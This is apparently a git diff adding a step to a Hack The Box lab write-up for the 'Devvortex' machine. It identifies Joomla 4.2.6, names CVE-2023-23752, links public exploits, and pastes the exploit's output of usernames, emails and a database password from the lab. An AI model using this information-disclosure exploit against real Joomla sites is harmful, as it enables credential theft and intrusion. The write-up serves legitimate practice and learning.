@@ -52,6 +52,45 @@ https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/joomla#ve
 Possible vulns
 ![imagen](https://github.com/PolGs/HTB-Open-Beta-Season-III/assets/19478700/a3519557-f24d-4a8f-ac37-bd460b692afb)
 ![imagen](https://github.com/PolGs/HTB-Open-Beta-Season-III/assets/19478700/2a6b15c8-c267-4c4c-a00a-a5241d7d96e5)
+![imagen](https://github.com/PolGs/HTB-Open-Beta-Season-III/assets/19478700/3d20a155-f422-425f-b405-87b8a813d4fa)
+![imagen](https://github.com/PolGs/HTB-Open-Beta-Season-III/assets/19478700/8499ed45-d418-453d-96b2-1d3d544f67ea)
+Verdsion 4.2.6
+Well try CVE-2023-23752
+![imagen](https://github.com/PolGs/HTB-Open-Beta-Season-III/assets/19478700/bb0b8e7b-7512-49ee-8500-a82143b54272)
+![imagen](https://github.com/PolGs/HTB-Open-Beta-Season-III/assets/19478700/264e5360-7d26-4527-9a71-c261ee248100)
+![imagen](https://github.com/PolGs/HTB-Open-Beta-Season-III/assets/19478700/6bd84eaf-ba63-4859-8ee8-589b934b8e53)
+![help](https://github.com/PolGs/HTB-Open-Beta-Season-III/assets/19478700/a6465125-326e-4baf-b833-07ec72587838)
+https://www.exploit-db.com/exploits/51334
+https://github.com/Acceis/exploit-CVE-2023-23752
+![imagen](https://github.com/PolGs/HTB-Open-Beta-Season-III/assets/19478700/48c8d6e5-3982-480d-9251-d05134b25373)
+```s
+Users
+[649] lewis (lewis) - lewis@devvortex.htb - Manager
+Administrator
+Super Users
+[650] logan paul (logan) - logan@devvortex.htb - Registered
+
+Site info
+Site name: Development
+Editor: tinymce
+Captcha: 0
+Access: 1
+Debug status: false
+
+Database info
+DB type: mysqli
+DB host: localhost
+DB user: lewis
+DB password: P4ntherg0t1n5r3c0n##
+DB name: joomla
+DB prefix: sd4fg_
+DB encryption 0
+```
+
+
+
+
+
 
 
 
